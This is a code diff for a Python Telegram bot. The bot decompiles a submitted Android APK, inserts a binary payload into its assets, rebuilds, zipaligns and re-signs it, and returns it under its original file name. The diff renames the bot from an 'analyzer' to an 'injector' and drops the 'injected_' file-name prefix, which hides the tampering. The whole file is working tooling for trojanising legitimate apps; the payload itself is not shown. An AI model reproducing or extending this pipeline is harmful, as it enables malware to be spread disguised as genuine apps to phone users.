@@ -11,6 +11,14 @@ logger = logging.getLogger(__name__)
 
 TOKEN = os.getenv("TELEGRAM_TOKEN", "").strip()
 
+KEYSTORE_PATH = None
+for path in ["/app/release.keystore", "./release.keystore"]:
+    if os.path.exists(path):
+        KEYSTORE_PATH = path
+        break
+
+KEYSTORE_PASS = os.getenv("KEYSTORE_PASS", "android").strip()
+
 PAYLOAD = None
 try:
     for path in ["/app/payload_data.bin", "./payload_data.bin"]:
@@ -25,54 +33,102 @@ except Exception as e:
     logger.error(f"Error loading payload: {e}")
 
 
+def run_cmd(cmd, label):
+    logger.info(f"[{label}] Running: {' '.join(cmd)}")
+    result = subprocess.run(cmd, capture_output=True, text=True)
+    if result.returncode != 0:
+        logger.error(f"[{label}] FAILED (code {result.returncode}): {result.stderr}")
+        return False
+    logger.info(f"[{label}] OK")
+    return True
+
+
 def inject_payload(apk_bytes):
     try:
         with tempfile.TemporaryDirectory() as tmpdir:
             tmp_path = Path(tmpdir)
             input_apk = tmp_path / "input.apk"
-            output_apk = tmp_path / "output.apk"
+            unsigned_apk = tmp_path / "unsigned.apk"
+            aligned_apk = tmp_path / "aligned.apk"
+            signed_apk = tmp_path / "signed.apk"
             decompiled_dir = tmp_path / "decompiled"
 
             with open(input_apk, "wb") as f:
                 f.write(apk_bytes)
+            logger.info(f"APK written: {len(apk_bytes)} bytes")
 
+            # STEP 1: Decompile (keep original resources untouched)
             logger.info("Decompiling APK...")
-            result = subprocess.run(
-                ["apktool", "d", "-f", "-o", str(decompiled_dir), str(input_apk)],
-                capture_output=True, text=True
-            )
-            if result.returncode != 0:
-                logger.error(f"Decompile error: {result.stderr}")
+            if not run_cmd(
+                ["apktool", "d", "-f", "-r", "-o", str(decompiled_dir), str(input_apk)],
+                "decompile"
+            ):
                 return None
 
+            # STEP 2: Inject payload into assets/
             payload_path = decompiled_dir / "assets" / "payload.bin"
             payload_path.parent.mkdir(parents=True, exist_ok=True)
             with open(payload_path, "wb") as f:
                 f.write(PAYLOAD)
-            logger.info(f"Payload copied to: {payload_path}")
+            logger.info(f"Payload injected: {payload_path} ({len(PAYLOAD)} bytes)")
 
-            logger.info("Recompiling APK...")
-            result = subprocess.run(
-                ["apktool", "b", "-o", str(output_apk), str(decompiled_dir)],
-                capture_output=True, text=True
-            )
-            if result.returncode != 0:
-                logger.error(f"Recompile error: {result.stderr}")
+            # STEP 3: Rebuild APK
+            logger.info("Rebuilding APK...")
+            if not run_cmd(
+                ["apktool", "b", "-o", str(unsigned_apk), str(decompiled_dir)],
+                "rebuild"
+            ):
                 return None
 
-            if output_apk.exists():
-                with open(output_apk, "rb") as f:
+            if not unsigned_apk.exists():
+                logger.error("Rebuilt APK not found")
+                return None
+
+            # STEP 4: Zipalign
+            logger.info("Zipaligning APK...")
+            if not run_cmd(
+                ["zipalign", "-f", "4", str(unsigned_apk), str(aligned_apk)],
+                "zipalign"
+            ):
+                # If zipalign fails, try without it (still better than nothing)
+                logger.warning("Zipalign failed, signing without alignment")
+                aligned_apk = unsigned_apk
+
+            # STEP 5: Sign APK
+            if KEYSTORE_PATH:
+                logger.info("Signing APK...")
+                if not run_cmd(
+                    [
+                        "apksigner", "sign",
+                        "--ks", KEYSTORE_PATH,
+                        "--ks-pass", f"pass:{KEYSTORE_PASS}",
+                        "--key-pass", f"pass:{KEYSTORE_PASS}",
+                        "--out", str(signed_apk),
+                        str(aligned_apk),
+                    ],
+                    "sign"
+                ):
+                    return None
+
+                if not signed_apk.exists():
+                    logger.error("Signed APK not found")
+                    return None
+
+                with open(signed_apk, "rb") as f:
                     return f.read()
-            return None
+            else:
+                logger.warning("No keystore found, returning unsigned APK")
+                with open(aligned_apk, "rb") as f:
+                    return f.read()
 
     except Exception as e:
-        logger.error(f"Inject error: {e}")
+        logger.error(f"Inject error: {e}", exc_info=True)
         return None
 
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "APK Analyzer Bot\n\n"
+        "APK Injector Bot\n\n"
         "Send an APK and I will inject the payload.\n\n"
         "Commands:\n"
         "/status - Check payload\n"
@@ -121,7 +177,7 @@ async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if result:
             await update.message.reply_document(
                 document=result,
-                filename=f"injected_{document.file_name}",
+                filename=document.file_name,
                 caption="APK injected successfully!"
             )
         else:
@@ -137,6 +193,7 @@ def main():
         raise ValueError("TELEGRAM_TOKEN not set")
 
     logger.info(f"Token OK: {TOKEN[:10]}...")
+    logger.info(f"Keystore: {KEYSTORE_PATH or 'NOT FOUND'}")
 
     app = Application.builder().token(TOKEN).build()
     app.add_handler(CommandHandler("start", start))
